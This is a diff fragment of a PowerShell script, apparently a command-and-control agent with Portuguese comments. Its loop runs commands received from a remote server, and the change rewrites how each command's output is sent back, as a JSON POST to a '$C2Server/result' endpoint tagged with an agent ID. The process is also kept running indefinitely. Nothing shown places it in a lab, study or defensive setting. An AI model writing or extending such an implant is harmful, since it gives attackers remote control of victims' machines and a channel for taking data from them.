@@ -81,10 +81,29 @@ while ($true) {
         # Executar comando
         $result = Execute-Command $response.command
         
-        # Enviar resultado
-        Send-Beacon @{
-            result = $result
-            command_id = $response.id
+       # Enviar resultado
+        try {
+            $resultBody = @{
+                id = $AgentID
+                data = @{
+                    result = $result
+                    command_id = $response.id
+                }
+            } | ConvertTo-Json
+
+            $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($resultBody)
+            $webRequest = [System.Net.WebRequest]::Create("$C2Server/result")
+            $webRequest.Method = "POST"
+            $webRequest.ContentType = "application/json; charset=utf-8"
+            $webRequest.ContentLength = $utf8Body.Length
+            $requestStream = $webRequest.GetRequestStream()
+            $requestStream.Write($utf8Body, 0, $utf8Body.Length)
+            $requestStream.Close()
+            $response2 = $webRequest.GetResponse()
+            $response2.Close()
+            Write-Host "[+] Resultado enviado!" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Erro ao enviar resultado: $_" -ForegroundColor Red
         }
     }
     
@@ -95,4 +114,5 @@ while ($true) {
 
 # Mantém o processo rodando
 while ($true) { Start-Sleep -Seconds 3600 }
+
 
